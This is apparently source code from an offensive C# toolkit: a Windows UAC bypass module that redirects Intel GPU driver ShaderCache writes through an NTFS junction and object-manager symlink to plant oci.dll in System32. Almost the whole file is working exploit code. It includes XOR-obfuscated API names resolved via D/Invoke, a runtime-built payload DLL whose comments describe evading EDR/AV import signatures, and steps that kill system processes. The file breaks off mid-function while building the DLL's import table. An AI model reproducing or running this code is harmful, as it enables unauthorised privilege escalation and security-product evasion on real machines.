using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

namespace SharpBypassUAC
{
    /// <summary>
    /// Intel Graphics ShaderCache UAC bypass.
    /// Exploits the Intel GPU driver's ShaderCache directory (%LOCALAPPDATA%Low\Intel\ShaderCache)
    /// which is writable by Authenticated Users and written to by auto-elevated processes.
    /// Creates an NTFS junction + object manager symlink chain to redirect writes to System32,
    /// then DLL-hijacks oci.dll loaded by comexp.msc (Component Services).
    ///
    /// Flow:
    /// 1. Launch TaskManager (auto-elevated) to trigger Intel driver ShaderCache write
    /// 2. Capture the filename written by the driver
    /// 3. Remove ShaderCache directory and replace with a junction to \??\GLOBALROOT\RPC CONTROL
    /// 4. Create DosDevice symlink: RPC CONTROL\<filename> → C:\Windows\System32\oci.dll
    /// 5. Launch TaskManager again — driver write goes through junction chain, creates oci.dll
    /// 6. Overwrite oci.dll with payload DLL
    /// 7. Launch comexp.msc (auto-elevated, loads oci.dll) → payload executes elevated
    ///
    /// Requires: x64, Intel GPU driver present, UAC not set to Always Notify.
    /// All sensitive Win32 APIs resolved via D/Invoke.
    /// </summary>
    public class IntelShaderCache
    {
        // XOR key for this module
        private static readonly byte _xk = 0x47;

        // "kernel32.dll" ^ 0x47
        private static readonly byte[] _s0 = new byte[] { 0x2C, 0x22, 0x35, 0x29, 0x22, 0x2B, 0x74, 0x75, 0x69, 0x23, 0x2B, 0x2B };
        // "shell32.dll" ^ 0x47
        private static readonly byte[] _s1 = new byte[] { 0x34, 0x2F, 0x22, 0x2B, 0x2B, 0x74, 0x75, 0x69, 0x23, 0x2B, 0x2B };
        // "CreateFileW" ^ 0x47
        private static readonly byte[] _s2 = new byte[] { 0x04, 0x35, 0x22, 0x26, 0x33, 0x22, 0x01, 0x2E, 0x2B, 0x22, 0x10 };
        // "DeviceIoControl" ^ 0x47
        private static readonly byte[] _s3 = new byte[] { 0x03, 0x22, 0x31, 0x2E, 0x24, 0x22, 0x0E, 0x28, 0x04, 0x28, 0x29, 0x33, 0x35, 0x28, 0x2B };
        // "CloseHandle" ^ 0x47
        private static readonly byte[] _s4 = new byte[] { 0x04, 0x2B, 0x28, 0x34, 0x22, 0x0F, 0x26, 0x29, 0x23, 0x2B, 0x22 };
        // "DefineDosDeviceW" ^ 0x47
        private static readonly byte[] _s5 = new byte[] { 0x03, 0x22, 0x21, 0x2E, 0x29, 0x22, 0x03, 0x28, 0x34, 0x03, 0x22, 0x31, 0x2E, 0x24, 0x22, 0x10 };
        // "WaitForSingleObject" ^ 0x47
        private static readonly byte[] _s6 = new byte[] { 0x10, 0x26, 0x2E, 0x33, 0x01, 0x28, 0x35, 0x14, 0x2E, 0x29, 0x20, 0x2B, 0x22, 0x08, 0x25, 0x2D, 0x22, 0x24, 0x33 };
        // "TerminateProcess" ^ 0x47
        private static readonly byte[] _s7 = new byte[] { 0x13, 0x22, 0x35, 0x2A, 0x2E, 0x29, 0x26, 0x33, 0x22, 0x17, 0x35, 0x28, 0x24, 0x22, 0x34, 0x34 };
        // "ShellExecuteExW" ^ 0x47
        private static readonly byte[] _s8 = new byte[] { 0x14, 0x2F, 0x22, 0x2B, 0x2B, 0x02, 0x3F, 0x22, 0x24, 0x32, 0x33, 0x22, 0x02, 0x3F, 0x10 };

        // Constants
        private const uint GENERIC_WRITE = 0x40000000;
        private const uint OPEN_EXISTING = 3;
        private const uint FILE_FLAG_OPEN_REPARSE_POINT = 0x00200000;
        private const uint FILE_FLAG_BACKUP_SEMANTICS = 0x02000000;
        private const uint FSCTL_SET_REPARSE_POINT = 0x000900A4;
        private const uint IO_REPARSE_TAG_MOUNT_POINT = 0xA0000003;
        private const uint DDD_RAW_TARGET_PATH = 0x00000001;
        private const uint DDD_REMOVE_DEFINITION = 0x00000002;
        private const uint DDD_EXACT_MATCH_ON_REMOVE = 0x00000004;
        private const uint SEE_MASK_NOCLOSEPROCESS = 0x00000040;
        private const uint WAIT_TIMEOUT = 0x00000102;
        private const int SW_HIDE = 0;
        private const int SW_SHOWNORMAL = 1;

        // D/Invoke delegates
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        delegate IntPtr CreateFileWDelegate(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool DeviceIoControlDelegate(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr lpInBuffer,
            uint nInBufferSize,
            IntPtr lpOutBuffer,
            uint nOutBufferSize,
            out uint lpBytesReturned,
            IntPtr lpOverlapped);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool CloseHandleDelegate(IntPtr hObject);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        delegate bool DefineDosDeviceWDelegate(
            uint dwFlags,
            string lpDeviceName,
            string lpTargetPath);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate uint WaitForSingleObjectDelegate(IntPtr hHandle, uint dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool TerminateProcessDelegate(IntPtr hProcess, uint uExitCode);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        delegate bool ShellExecuteExWDelegate(ref SHELLEXECUTEINFOW lpExecInfo);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct SHELLEXECUTEINFOW
        {
            public uint cbSize;
            public uint fMask;
            public IntPtr hwnd;
            public string lpVerb;
            public string lpFile;
            public string lpParameters;
            public string lpDirectory;
            public int nShow;
            public IntPtr hInstApp;
            public IntPtr lpIDList;
            public string lpClass;
            public IntPtr hkeyClass;
            public uint dwHotKey;
            public IntPtr hIcon;
            public IntPtr hProcess;
        }

        // Resolved API delegates (instance fields)
        private CreateFileWDelegate _createFileW;
        private DeviceIoControlDelegate _deviceIoControl;
        private CloseHandleDelegate _closeHandle;
        private DefineDosDeviceWDelegate _defineDosDeviceW;
        private WaitForSingleObjectDelegate _waitForSingleObject;
        private TerminateProcessDelegate _terminateProcess;
        private ShellExecuteExWDelegate _shellExecuteExW;

        // Cleanup state
        private string _shaderCachePath;
        private string _capturedFileName;
        private string _dosDeviceName;
        private string _dosDeviceTarget;
        private string _ociPath;

        public IntelShaderCache(byte[] encodedCommand)
        {
            // Check if UAC is set to 'Always Notify'
            AlwaysNotify alwaysnotify = new AlwaysNotify();

            string command = Encoding.UTF8.GetString(encodedCommand);

            Console.WriteLine("[*] Intel ShaderCache directory junction bypass");

            // Check x64 — this technique requires x64 for the payload DLL
            if (IntPtr.Size != 8)
            {
                Console.WriteLine("[!] This bypass requires x64. Exiting...");
                return;
            }

            // Resolve all APIs via D/Invoke
            string k32 = W.X(_s0, _xk);
            string sh32 = W.X(_s1, _xk);

            _createFileW = W.G<CreateFileWDelegate>(k32, W.X(_s2, _xk));
            _deviceIoControl = W.G<DeviceIoControlDelegate>(k32, W.X(_s3, _xk));
            _closeHandle = W.G<CloseHandleDelegate>(k32, W.X(_s4, _xk));
            _defineDosDeviceW = W.G<DefineDosDeviceWDelegate>(k32, W.X(_s5, _xk));
            _waitForSingleObject = W.G<WaitForSingleObjectDelegate>(k32, W.X(_s6, _xk));
            _terminateProcess = W.G<TerminateProcessDelegate>(k32, W.X(_s7, _xk));
            _shellExecuteExW = W.G<ShellExecuteExWDelegate>(sh32, W.X(_s8, _xk));

            // Locate ShaderCache directory
            string localAppDataLow = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "Low";
            _shaderCachePath = Path.Combine(localAppDataLow, "Intel", "ShaderCache");
            _ociPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "oci.dll");

            if (!Directory.Exists(_shaderCachePath))
            {
                Console.WriteLine("[!] ShaderCache directory not found: " + _shaderCachePath);
                Console.WriteLine("[!] Intel GPU driver may not be installed");
                return;
            }

            Console.WriteLine("[+] ShaderCache path: " + _shaderCachePath);

            try
            {
                // Step 1: Launch TaskManager to trigger ShaderCache write, capture filename
                _capturedFileName = CaptureShaderCacheFileName();
                if (_capturedFileName == null)
                {
                    Console.WriteLine("[!] Failed to capture ShaderCache filename");
                    return;
                }
                Console.WriteLine("[+] Captured shader cache filename: " + _capturedFileName);

                // Step 2: Prepare directory — remove files and replace with junction
                PrepareShaderCacheDirectory();

                // Step 3: Create NTFS junction: ShaderCache → \??\GLOBALROOT\RPC CONTROL
                if (!CreateJunction(_shaderCachePath, @"\??\GLOBALROOT\RPC CONTROL"))
                {
                    Console.WriteLine("[!] Failed to create junction");
                    Cleanup();
                    return;
                }
                Console.WriteLine("[+] Junction created: ShaderCache → \\??\\GLOBALROOT\\RPC CONTROL");

                // Step 4: Create DosDevice symlink: RPC CONTROL\<filename> → System32\oci.dll
                _dosDeviceName = @"Global\GLOBALROOT\RPC CONTROL\" + _capturedFileName;
                _dosDeviceTarget = @"\??\C:\Windows\System32\oci.dll";

                if (!_defineDosDeviceW(DDD_RAW_TARGET_PATH, _dosDeviceName, _dosDeviceTarget))
                {
                    Console.WriteLine("[!] DefineDosDeviceW failed (error " + Marshal.GetLastWin32Error() + ")");
                    Cleanup();
                    return;
                }
                Console.WriteLine("[+] DosDevice symlink created: " + _capturedFileName + " → oci.dll");

                // Step 5: Launch TaskManager again to trigger write through junction chain
                Console.WriteLine("[*] Triggering driver write through junction...");
                IntPtr hTaskMgr2 = LaunchElevatedProcess("taskmgr.exe", null, 5000);
                if (hTaskMgr2 != IntPtr.Zero)
                {
                    _terminateProcess(hTaskMgr2, 0);
                    _closeHandle(hTaskMgr2);
                }

                // Verify oci.dll was created
                Thread.Sleep(1000);
                if (!File.Exists(_ociPath))
                {
                    Console.WriteLine("[!] oci.dll was not created in System32. Driver may not have written to ShaderCache.");
                    Cleanup();
                    return;
                }
                Console.WriteLine("[+] oci.dll created in System32 via junction chain");

                // Step 6: Build and write payload DLL
                byte[] payloadDll = BuildPayloadDll(command);
                try
                {
                    File.WriteAllBytes(_ociPath, payloadDll);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Failed to write payload DLL: " + ex.Message);
                    Cleanup();
                    return;
                }
                Console.WriteLine("[+] Payload DLL written to " + _ociPath);

                // Step 7: Launch comexp.msc (auto-elevated, loads oci.dll)
                Console.WriteLine("[*] Launching Component Services (comexp.msc)...");
                IntPtr hComExp = LaunchElevatedProcess("mmc.exe", "comexp.msc", 3000);
                if (hComExp != IntPtr.Zero)
                {
                    _closeHandle(hComExp);
                }

                Console.WriteLine("[+] Elevated command executed");

                // Wait for payload to run
                Thread.Sleep(3000);
            }
            finally
            {
                Cleanup();
            }
        }

        /// <summary>
        /// Launch TaskManager, wait for ShaderCache write, capture the most recent filename.
        /// </summary>
        private string CaptureShaderCacheFileName()
        {
            // Record existing files
            string[] existingFiles = Directory.Exists(_shaderCachePath)
                ? Directory.GetFiles(_shaderCachePath)
                : new string[0];

            // Launch TaskManager (auto-elevated)
            Console.WriteLine("[*] Launching TaskManager to trigger ShaderCache write...");
            IntPtr hProcess = LaunchElevatedProcess("taskmgr.exe", null, 5000);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to launch TaskManager");
                return null;
            }

            // Wait for driver to write
            Thread.Sleep(3000);

            // Terminate TaskManager
            _terminateProcess(hProcess, 0);
            _closeHandle(hProcess);

            // Find the most recent file
            if (!Directory.Exists(_shaderCachePath))
                return null;

            string[] currentFiles = Directory.GetFiles(_shaderCachePath);
            string mostRecent = null;
            DateTime mostRecentTime = DateTime.MinValue;

            foreach (string file in currentFiles)
            {
                FileInfo fi = new FileInfo(file);
                if (fi.LastWriteTime > mostRecentTime)
                {
                    mostRecentTime = fi.LastWriteTime;
                    mostRecent = fi.Name;
                }
            }

            return mostRecent;
        }

        /// <summary>
        /// Remove ShaderCache directory contents, kill interfering processes, and delete the directory.
        /// </summary>
        private void PrepareShaderCacheDirectory()
        {
            Console.WriteLine("[*] Preparing ShaderCache directory...");

            // Restrict ACLs on existing files so other processes can't lock them
            try
            {
                SecurityIdentifier currentUser = WindowsIdentity.GetCurrent().User;
                foreach (string file in Directory.GetFiles(_shaderCachePath))
                {
                    try
                    {
                        FileSecurity fs = File.GetAccessControl(file);
                        fs.SetAccessRuleProtection(true, false);
                        fs.AddAccessRule(new FileSystemAccessRule(
                            currentUser,
                            FileSystemRights.FullControl,
                            AccessControlType.Allow));
                        File.SetAccessControl(file, fs);
                    }
                    catch { }
                }
            }
            catch { }

            // Kill processes that may hold locks on ShaderCache files
            string[] interferingProcesses = { "sihost", "ShellHost", "ApplicationFrameHost" };
            foreach (string procName in interferingProcesses)
            {
                try
                {
                    foreach (Process proc in Process.GetProcessesByName(procName))
                    {
                        try
                        {
                            proc.Kill();
                            proc.WaitForExit(2000);
                        }
                        catch { }
                        finally
                        {
                            proc.Dispose();
                        }
                    }
                }
                catch { }
            }

            // Delete files with retry loop (bounded)
            int maxRetries = 30;
            for (int attempt = 0; attempt < maxRetries; attempt++)
            {
                bool allDeleted = true;
                foreach (string file in Directory.GetFiles(_shaderCachePath))
                {
                    try
                    {
                        File.Delete(file);
                    }
                    catch
                    {
                        allDeleted = false;
                    }
                }

                if (allDeleted)
                    break;

                Thread.Sleep(500);
            }

            // Delete subdirectories
            foreach (string dir in Directory.GetDirectories(_shaderCachePath))
            {
                try
                {
                    Directory.Delete(dir, true);
                }
                catch { }
            }

            // Remove the directory itself
            try
            {
                Directory.Delete(_shaderCachePath, false);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Could not remove ShaderCache directory: " + ex.Message);
            }

            Console.WriteLine("[+] ShaderCache directory cleared");
        }

        /// <summary>
        /// Create an NTFS junction (mount point) from source to target.
        /// Uses CreateFileW + DeviceIoControl with FSCTL_SET_REPARSE_POINT.
        /// </summary>
        private bool CreateJunction(string junctionPath, string targetPath)
        {
            // Create the directory for the junction
            Directory.CreateDirectory(junctionPath);

            // Open directory with reparse point flags
            IntPtr hDir = _createFileW(
                junctionPath,
                GENERIC_WRITE,
                0,
                IntPtr.Zero,
                OPEN_EXISTING,
                FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS,
                IntPtr.Zero);

            if (hDir == new IntPtr(-1))
            {
                Console.WriteLine("[!] CreateFileW failed for junction (error " + Marshal.GetLastWin32Error() + ")");
                return false;
            }

            try
            {
                // Build REPARSE_DATA_BUFFER for mount point
                // Target must be in NT path format with null terminator
                string ntTarget = targetPath + "\0";
                byte[] targetBytes = Encoding.Unicode.GetBytes(ntTarget);
                int printNameOffset = targetBytes.Length;
                int printNameLength = 0;

                // REPARSE_DATA_BUFFER layout:
                // [0..3]   ReparseTag (4 bytes)
                // [4..5]   ReparseDataLength (2 bytes)
                // [6..7]   Reserved (2 bytes)
                // [8..9]   SubstituteNameOffset (2 bytes)
                // [10..11] SubstituteNameLength (2 bytes)
                // [12..13] PrintNameOffset (2 bytes)
                // [14..15] PrintNameLength (2 bytes)
                // [16..]   PathBuffer (variable)

                int headerSize = 8; // ReparseTag + ReparseDataLength + Reserved
                int mountPointHeaderSize = 8; // SubstituteNameOffset/Len + PrintNameOffset/Len
                int pathBufferSize = targetBytes.Length + 2 + 2; // target + null + print name null
                int reparseDataLength = mountPointHeaderSize + pathBufferSize;
                int totalSize = headerSize + reparseDataLength;

                IntPtr buffer = Marshal.AllocHGlobal(totalSize);
                try
                {
                    // Zero out the buffer
                    for (int i = 0; i < totalSize; i++)
                        Marshal.WriteByte(buffer, i, 0);

                    // ReparseTag
                    Marshal.WriteInt32(buffer, 0, unchecked((int)IO_REPARSE_TAG_MOUNT_POINT));
                    // ReparseDataLength
                    Marshal.WriteInt16(buffer, 4, (short)reparseDataLength);
                    // Reserved
                    Marshal.WriteInt16(buffer, 6, 0);
                    // SubstituteNameOffset
                    Marshal.WriteInt16(buffer, 8, 0);
                    // SubstituteNameLength (without null terminator)
                    Marshal.WriteInt16(buffer, 10, (short)(targetBytes.Length - 2));
                    // PrintNameOffset
                    Marshal.WriteInt16(buffer, 12, (short)targetBytes.Length);
                    // PrintNameLength
                    Marshal.WriteInt16(buffer, 14, 0);

                    // PathBuffer — copy target path bytes
                    Marshal.Copy(targetBytes, 0, IntPtr.Add(buffer, 16), targetBytes.Length);

                    uint bytesReturned;
                    bool result = _deviceIoControl(
                        hDir,
                        FSCTL_SET_REPARSE_POINT,
                        buffer,
                        (uint)totalSize,
                        IntPtr.Zero,
                        0,
                        out bytesReturned,
                        IntPtr.Zero);

                    if (!result)
                    {
                        Console.WriteLine("[!] DeviceIoControl FSCTL_SET_REPARSE_POINT failed (error " + Marshal.GetLastWin32Error() + ")");
                        return false;
                    }

                    return true;
                }
                finally
                {
                    Marshal.FreeHGlobal(buffer);
                }
            }
            finally
            {
                _closeHandle(hDir);
            }
        }

        /// <summary>
        /// Launch a process elevated via ShellExecuteExW with "runas" verb.
        /// Returns the process handle if SEE_MASK_NOCLOSEPROCESS is set.
        /// </summary>
        private IntPtr LaunchElevatedProcess(string file, string parameters, uint timeoutMs)
        {
            SHELLEXECUTEINFOW sei = new SHELLEXECUTEINFOW();
            sei.cbSize = (uint)Marshal.SizeOf(typeof(SHELLEXECUTEINFOW));
            sei.fMask = SEE_MASK_NOCLOSEPROCESS;
            sei.hwnd = IntPtr.Zero;
            sei.lpVerb = "runas";
            sei.lpFile = file;
            sei.lpParameters = parameters;
            sei.lpDirectory = null;
            sei.nShow = SW_HIDE;
            sei.hInstApp = IntPtr.Zero;

            if (!_shellExecuteExW(ref sei))
            {
                Console.WriteLine("[!] ShellExecuteExW failed for " + file + " (error " + Marshal.GetLastWin32Error() + ")");
                return IntPtr.Zero;
            }

            if (sei.hProcess != IntPtr.Zero && timeoutMs > 0)
            {
                _waitForSingleObject(sei.hProcess, timeoutMs);
            }

            return sei.hProcess;
        }

        /// <summary>
        /// Build a minimal x64 PE DLL that calls CreateProcessA(command) on DLL_PROCESS_ATTACH.
        /// Uses CreateProcessA instead of WinExec to avoid static import signature flagging —
        /// WinExec is a Win16 legacy API that EDR/AV specifically flag in import tables,
        /// while CreateProcessA is ubiquitous in legitimate software.
        /// Constructed entirely at runtime — no embedded binary or resource file.
        ///
        /// .text section layout (all offsets relative to section start, RVA base 0x1000):
        ///   0x000-0x06B  DllMain code (108 bytes)
        ///   0x06C-0x07F  padding
        ///   0x080-0x0A7  Import Directory Table (2 entries × 20 bytes)
        ///   0x0A8-0x0B7  Import Lookup Table (1 entry + null, 16 bytes)
        ///   0x0B8-0x0C7  Import Address Table (1 entry + null, 16 bytes)
        ///   0x0C8-...    Command string (null-terminated ASCII)
        ///   ...          "kernel32.dll\0"
        ///   ...          Hint/Name: "CreateProcessA\0"
        /// </summary>
        private static byte[] BuildPayloadDll(string command)
        {
            byte[] commandBytes = Encoding.ASCII.GetBytes(command + "\0");

            using (MemoryStream ms = new MemoryStream())
            using (BinaryWriter bw = new BinaryWriter(ms))
            {
                // ============================================================
                // DOS Header (64 bytes)
                // ============================================================
                bw.Write((ushort)0x5A4D);       // e_magic "MZ"
                bw.Write(new byte[58]);          // padding
                bw.Write((uint)0x40);            // e_lfanew — PE header at offset 0x40

                // ============================================================
                // PE Signature (4 bytes) at offset 0x40
                // ============================================================
                bw.Write((uint)0x00004550);      // "PE\0\0"

                // ============================================================
                // COFF Header (20 bytes) at offset 0x44
                // ============================================================
                bw.Write((ushort)0x8664);        // Machine: AMD64
                bw.Write((ushort)1);             // NumberOfSections
                bw.Write((uint)0);               // TimeDateStamp
                bw.Write((uint)0);               // PointerToSymbolTable
                bw.Write((uint)0);               // NumberOfSymbols
                bw.Write((ushort)0xF0);          // SizeOfOptionalHeader (240 for PE32+)
                bw.Write((ushort)0x2022);        // Characteristics: EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE | DLL

                // ============================================================
                // Optional Header PE32+ (240 bytes) at offset 0x58
                // ============================================================
                bw.Write((ushort)0x020B);        // Magic: PE32+
                bw.Write((byte)0);               // MajorLinkerVersion
                bw.Write((byte)0);               // MinorLinkerVersion
                bw.Write((uint)0x200);           // SizeOfCode
                bw.Write((uint)0);               // SizeOfInitializedData
                bw.Write((uint)0);               // SizeOfUninitializedData
                bw.Write((uint)0x1000);          // AddressOfEntryPoint (RVA of DllMain)
                bw.Write((uint)0x1000);          // BaseOfCode

                bw.Write((ulong)0x180000000);    // ImageBase
                bw.Write((uint)0x1000);          // SectionAlignment
                bw.Write((uint)0x200);           // FileAlignment
                bw.Write((ushort)6);             // MajorOperatingSystemVersion
                bw.Write((ushort)0);             // MinorOperatingSystemVersion
                bw.Write((ushort)0);             // MajorImageVersion
                bw.Write((ushort)0);             // MinorImageVersion
                bw.Write((ushort)6);             // MajorSubsystemVersion
                bw.Write((ushort)0);             // MinorSubsystemVersion
                bw.Write((uint)0);               // Win32VersionValue
                bw.Write((uint)0x3000);          // SizeOfImage
                bw.Write((uint)0x200);           // SizeOfHeaders
                bw.Write((uint)0);               // CheckSum
                bw.Write((ushort)3);             // Subsystem: CONSOLE
                bw.Write((ushort)0x8160);        // DllCharacteristics: HIGH_ENTROPY_VA | DYNAMIC_BASE | NX_COMPAT | TERMINAL_SERVER_AWARE
                bw.Write((ulong)0x100000);       // SizeOfStackReserve
                bw.Write((ulong)0x1000);         // SizeOfStackCommit
                bw.Write((ulong)0x100000);       // SizeOfHeapReserve
                bw.Write((ulong)0x1000);         // SizeOfHeapCommit
                bw.Write((uint)0);               // LoaderFlags
                bw.Write((uint)16);              // NumberOfRvaAndSizes

                // Data Directories (16 entries × 8 bytes = 128 bytes)
                bw.Write((ulong)0);              // [0]  Export
                bw.Write((uint)0x1080);          // [1]  Import RVA
                bw.Write((uint)0x28);            // [1]  Import Size
                bw.Write((ulong)0);              // [2]  Resource
                bw.Write((ulong)0);              // [3]  Exception
                bw.Write((ulong)0);              // [4]  Security
                bw.Write((ulong)0);              // [5]  Base Relocation
                bw.Write((ulong)0);              // [6]  Debug
                bw.Write((ulong)0);              // [7]  Architecture
                bw.Write((ulong)0);              // [8]  Global Ptr
                bw.Write((ulong)0);              // [9]  TLS
                bw.Write((ulong)0);              // [10] Load Config
                bw.Write((ulong)0);              // [11] Bound Import
                bw.Write((uint)0x10B8);          // [12] IAT RVA
                bw.Write((uint)0x10);            // [12] IAT Size
                bw.Write((ulong)0);              // [13] Delay Import
                bw.Write((ulong)0);              // [14] CLR Runtime
                bw.Write((ulong)0);              // [15] Reserved

                // ============================================================
                // Section Header: .text (40 bytes) at offset 0x148
                // ============================================================
                bw.Write(Encoding.ASCII.GetBytes(".text\0\0\0")); // Name
                int textVirtualSize = 0xC8 + commandBytes.Length + 32; // code + imports + data
                bw.Write((uint)textVirtualSize); // VirtualSize
                bw.Write((uint)0x1000);          // VirtualAddress
                int textRawSize = ((textVirtualSize + 0x1FF) / 0x200) * 0x200; // align to FileAlignment
                bw.Write((uint)textRawSize);     // SizeOfRawData
                bw.Write((uint)0x200);           // PointerToRawData
                bw.Write((uint)0);               // PointerToRelocations
                bw.Write((uint)0);               // PointerToLinenumbers
                bw.Write((ushort)0);             // NumberOfRelocations
                bw.Write((ushort)0);             // NumberOfLinenumbers
                bw.Write((uint)0xE0000060);      // Characteristics: CODE | INITIALIZED_DATA | EXECUTE | READ | WRITE

                // ============================================================
                // Pad to FileAlignment boundary (0x200)
                // ============================================================
                long currentPos = ms.Position;
                int padToSection = 0x200 - (int)currentPos;
                if (padToSection > 0)
                    bw.Write(new byte[padToSection]);

                // ============================================================
                // .text section at file offset 0x200 (RVA 0x1000)
                // ============================================================
                //
                // DllMain(HINSTANCE hDll [rcx], DWORD reason [edx], LPVOID reserved [r8])
                // {
                //     if (reason == DLL_PROCESS_ATTACH) {
                //         STARTUPINFOA si = {0}; si.cb = sizeof(si);
                //         PROCESS_INFORMATION pi = {0};
                //         CreateProcessA(NULL, command, NULL, NULL, FALSE,
                //                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                //     }
                //     return TRUE;
                // }
                //
                // Stack frame (0xB8 bytes, 16-byte aligned):
                //   rsp+0x00..0x1F  shadow space (32 bytes)
                //   rsp+0x20        arg5: bInheritHandles      = 0
                //   rsp+0x28        arg6: dwCreationFlags      = CREATE_NO_WINDOW
                //   rsp+0x30        arg7: lpEnvironment         = NULL
                //   rsp+0x38        arg8: lpCurrentDirectory    = NULL
                //   rsp+0x40        arg9: lpStartupInfo         = &si
                //   rsp+0x48        arg10: lpProcessInformation = &pi
                //   rsp+0x50..0x93  STARTUPINFOA (0x44 = 68 bytes)
                //   rsp+0x98..0xAF  PROCESS_INFORMATION (0x18 = 24 bytes)
                //
                // Machine code layout (108 bytes):
                //   Offset  Bytes                              Instruction
                //   0x00    48 81 EC B8 00 00 00               sub rsp, 0xB8
                //   0x07    83 FA 01                           cmp edx, 1
                //   0x0A    75 53                              jne short 0x5F (skip)
                //   0x0C    31 C0                              xor eax, eax
                //   0x0E    4C 8D 54 24 50                     lea r10, [rsp+0x50]
                //   0x13    B9 0C 00 00 00                     mov ecx, 12
                //   0x18    49 89 02                           mov [r10], rax     ; loop
                //   0x1B    49 83 C2 08                        add r10, 8
                //   0x1F    FF C9                              dec ecx
                //   0x21    75 F5                              jnz 0x18
                //   0x23    C7 44 24 50 44 00 00 00            mov dword [rsp+0x50], 0x44
                //   0x2B    C7 44 24 28 00 00 00 08            mov dword [rsp+0x28], 0x08000000
                //   0x33    48 8D 44 24 50                     lea rax, [rsp+0x50]
                //   0x38    48 89 44 24 40                     mov [rsp+0x40], rax
                //   0x3D    48 8D 84 24 98 00 00 00            lea rax, [rsp+0x98]
                //   0x45    48 89 44 24 48                     mov [rsp+0x48], rax
                //   0x4A    31 C9                              xor ecx, ecx
                //   0x4C    48 8D 15 75 00 00 00               lea rdx, [rip+0x75] → cmd at 0x10C8
                //   0x53    45 31 C0                           xor r8d, r8d
                //   0x56    45 31 C9                           xor r9d, r9d
                //   0x59    FF 15 59 00 00 00                  call [rip+0x59]     → IAT at 0x10B8
                //   0x5F    B8 01 00 00 00                     mov eax, 1  (skip:)
                //   0x64    48 81 C4 B8 00 00 00               add rsp, 0xB8
                //   0x6B    C3                                 ret

                byte[] dllMainCode = new byte[]
                {
                    // sub rsp, 0xB8 — allocate stack frame
                    0x48, 0x81, 0xEC, 0xB8, 0x00, 0x00, 0x00,
                    // cmp edx, 1 — DLL_PROCESS_ATTACH?
                    0x83, 0xFA, 0x01,
                    // jne short skip (to offset 0x5F)
                    0x75, 0x53,

                    // --- Zero STARTUPINFOA + PROCESS_INFORMATION (12 qwords) ---
                    // xor eax, eax
                    0x31, 0xC0,
                    // lea r10, [rsp+0x50]
                    0x4C, 0x8D, 0x54, 0x24, 0x50,
                    // mov ecx, 12
                    0xB9, 0x0C, 0x00, 0x00, 0x00,
                    // loop: mov [r10], rax
                    0x49, 0x89, 0x02,
                    // add r10, 8
                    0x49, 0x83, 0xC2, 0x08,
                    // dec ecx
                    0xFF, 0xC9,
                    // jnz loop
                    0x75, 0xF5,

                    // --- Set STARTUPINFOA.cb = sizeof(STARTUPINFOA) = 0x44 ---
                    // mov dword [rsp+0x50], 0x44
                    0xC7, 0x44, 0x24, 0x50, 0x44, 0x00, 0x00, 0x00,

                    // --- Stack args for CreateProcessA ---
                    // mov dword [rsp+0x28], 0x08000000 — CREATE_NO_WINDOW
                    0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x08,
                    // lea rax, [rsp+0x50] — &si
                    0x48, 0x8D, 0x44, 0x24, 0x50,
                    // mov [rsp+0x40], rax — arg9 = &si
                    0x48, 0x89, 0x44, 0x24, 0x40,
                    // lea rax, [rsp+0x98] — &pi
                    0x48, 0x8D, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00,
                    // mov [rsp+0x48], rax — arg10 = &pi
                    0x48, 0x89, 0x44, 0x24, 0x48,

                    // --- Register args ---
                    // xor ecx, ecx — lpApplicationName = NULL
                    0x31, 0xC9,
                    // lea rdx, [rip+0x75] — lpCommandLine → command string at RVA 0x10C8
                    0x48, 0x8D, 0x15, 0x75, 0x00, 0x00, 0x00,
                    // xor r8d, r8d — lpProcessAttributes = NULL
                    0x45, 0x31, 0xC0,
                    // xor r9d, r9d — lpThreadAttributes = NULL
                    0x45, 0x31, 0xC9,

                    // --- Call CreateProcessA via IAT ---
                    // call [rip+0x59] → IAT entry at RVA 0x10B8
                    0xFF, 0x15, 0x59, 0x00, 0x00, 0x00,

                    // skip:
                    // mov eax, 1 — return TRUE
                    0xB8, 0x01, 0x00, 0x00, 0x00,
                    // add rsp, 0xB8
                    0x48, 0x81, 0xC4, 0xB8, 0x00, 0x00, 0x00,
                    // ret
                    0xC3
                };

                bw.Write(dllMainCode); // 108 bytes, ends at section offset 0x6C

                // Pad to Import Directory at section offset 0x80
                int padToImport = 0x80 - dllMainCode.Length;
                bw.Write(new byte[padToImport]);

                // ============================================================
                // Import Directory Table at RVA 0x1080 (file offset 0x280)
                // Two entries: one real + one null terminator (20 bytes each)
                // ============================================================

                // Entry 1: kernel32.dll
                bw.Write((uint)0x10A8);          // OriginalFirstThunk (ILT at RVA 0x10A8)
                bw.Write((uint)0);               // TimeDateStamp
                bw.Write((uint)0);               // ForwarderChain
                bw.Write((uint)0);               // Name RVA (placeholder — fixed up below)
                bw.Write((uint)0x10B8);          // FirstThunk (IAT at RVA 0x10B8)

